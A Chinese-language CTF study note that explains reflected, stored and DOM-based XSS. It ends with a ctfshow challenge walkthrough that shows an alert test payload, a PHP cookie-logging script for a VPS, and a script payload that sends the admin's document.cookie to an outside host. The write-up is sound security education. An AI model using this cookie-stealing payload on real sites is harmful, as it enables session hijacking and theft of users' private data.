---
title: XSS
description: XSS笔记
tags:
  - CTF
  - WEB
categories:
  - 笔记
cover: 'https://tuchuang.voooe.cn/images/2024/05/15/_202405151024302.jpg'
abbrlink: XSS
date: 2024-05-16 09:40:00
---
> XSS的本质是一种高级钓鱼手法。
## 认识XSS
XSS (Cross Site Scripting) 攻击全称跨站脚本攻击，是为不和层叠样式表 (Cascading Style Sheets, CSS) 的缩写混淆，故将跨站脚本攻击缩写为 XSS。

XSS 是一种经常出现在 Web 应用中的计算机安全漏洞，它允许恶意 Web 用户将代码植入到提供给其它用户使用的页面中。

在XSS攻击中，一般有三个角色参与：攻击者、目标服务器、受害者的浏览器。

原理：将恶意的 script 脚本插入进 html/css/js 文件当中。
![](https://s2.loli.net/2024/05/16/qZwLKH4DnGfRAxv.jpg)

### 反射型XSS
反射型XSS，又称非持久型XSS。
之所以称为反射型XSS，是因为这种攻击方式的注入代码是从目标服务器通过错误信息、搜索结果等等方式“反射”回来的：发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，故叫反射型XSS。 
而称为非持久型XSS，则是因为这种攻击方式具有一次性，由于代码注入的是一个动态产生的页面而不是永久的页面，因此这种攻击方式只在点击链接的时候才产生作用。

特点：
① 不经过服务器存储，直接通过 HTTP 的 GET 和 POST 请求就能完成一次攻击，拿到用户隐私数据；
②攻击者需要诱骗点击；
③反馈率低，所以较难发现和响应修复；
④盗取用户敏感保密信息。



### 存储型XSS
存储型XSS，又称持久型XSS。
他和反射型XSS最大的不同就是，攻击脚本将被永久地存放在目标服务器端（数据库，内存，文件系统等），下次请求目标页面时不用再提交XSS代码。
一般存在于 Form 表单提交等交互功能，如发帖留言，提交文本信息等，多见于论坛。黑客利用的 XSS 漏洞，将内容经正常功能提交进入数据库持久保存，当前端页面获得后端从数据库中读出的注入代码时，恰好将其渲染执行。
特点：
①持久性，植入在数据库中；
②危害面广，甚至可以让用户机器变成 DDoS 攻击的肉鸡；
③ 盗取用户敏感私密信息。

### DOM型XSS
DOM型XSS 是基于文档对象模型 Document Objeet Model，DOM)的一种漏洞。对于img，input等这种类型的 DOM 节点标签，DOM型XSS就可以利用其进行攻击
DOM 型 XSS 全部都是由前端进行触发的。

## 反射型XSS的利用
### 例题：ctfshow web入门 316
![](https://s2.loli.net/2024/05/16/6gCEYtPqxIbyzpm.png)
输入什么就返回什么，尝试执行js代码`<script>alert(1)</script>`
![](https://s2.loli.net/2024/05/16/UwjXucIGtZBNbrv.png)
成功返回了弹窗
> 本题的flag在管理员的cookie中，机器人会定时自动点击生成的链接

创建一个自动接收脚本a.php在vps上
```php
<?php
$cookie = $_GET['cookie'];
$log = fopen("cookie.txt", "a");
fwrite($log, $cookie . "\n");
fclose($log);
?>
```
生成Xss代码链接,用于获取管理员cookie

`<script>document.location.href='http://ip:port/a.php?cookie='+document.cookie</script>`

python3 -m http.server监听即可拿到cookie

![](https://s2.loli.net/2024/05/16/tjV7pHcQsOndNZC.png)











## 未完待续
参考：
[从0到1完全掌握 XSS](https://www.freebuf.com/articles/web/334662.html)
[web攻防之XSS攻击详解——XSS简介与类型](https://zhuanlan.zhihu.com/p/342603075)
